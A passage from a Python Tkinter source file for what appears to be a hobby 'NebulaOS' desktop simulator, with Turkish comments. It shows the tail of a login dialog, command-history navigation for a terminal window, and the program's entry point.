                sys.stdout = original_stdout 
            else:
                messagebox.showerror("Giriş Hatası", "Hata: Geçersiz kullanıcı adı veya kimlik doğrulama anahtarı. Tekrar deneyin.")
                print("Hata: Geçersiz kullanıcı adı veya kimlik doğrulama anahtarı. Tekrar deneyin.")
                self.add_log(f"Kullanıcı için başarısız giriş denemesi: {username}")
                self.master.after(500, show_login_dialog)

        self.master.after(100, show_login_dialog)

    def update_prompt(self):
        """Terminal istemini günceller (masaüstü modunda kullanılmaz)."""
        pass # Masaüstü modunda terminal istemi doğrudan terminal penceresi tarafından yönetilir.

    def history_up(self, event=None):
        """Komut geçmişinde yukarı gider."""
        if self.command_history:
            if self.history_index == -1:
                self.history_index = len(self.command_history) - 1
            elif self.history_index > 0:
                self.history_index -= 1
            
            # command_entry'yi bul ve güncelle
            # Bu fonksiyon sadece terminal penceresi açıkken çağrılmalı
            if hasattr(sys.stdout, 'widget') and isinstance(sys.stdout.widget, scrolledtext.ScrolledText):
                terminal_window = sys.stdout.widget.master
                for widget in terminal_window.winfo_children():
                    if isinstance(widget, tk.Frame): # input_frame
                        for child in widget.winfo_children():
                            if isinstance(child, tk.Entry): # command_entry
                                child.delete(0, tk.END)
                                child.insert(0, self.command_history[self.history_index])
                                break
                
    def history_down(self, event=None):
        """Komut geçmişinde aşağı gider."""
        if self.command_history:
            if self.history_index < len(self.command_history) - 1:
                self.history_index += 1
            elif self.history_index == len(self.command_history) - 1:
                self.history_index = -1 # En sona gelince boşalt
            
            # command_entry'yi bul ve güncelle
            if hasattr(sys.stdout, 'widget') and isinstance(sys.stdout.widget, scrolledtext.ScrolledText):
                terminal_window = sys.stdout.widget.master
                for widget in terminal_window.winfo_children():
                    if isinstance(widget, tk.Frame): # input_frame
                        for child in widget.winfo_children():
                            if isinstance(child, tk.Entry): # command_entry
                                child.delete(0, tk.END)
                                if self.history_index != -1:
                                    child.insert(0, self.command_history[self.history_index])
                                break


# --- Ana Uygulama Giriş Noktası ---
if __name__ == "__main__":
    root = tk.Tk()
    app = NebulaOSApp(root)
    root.mainloop()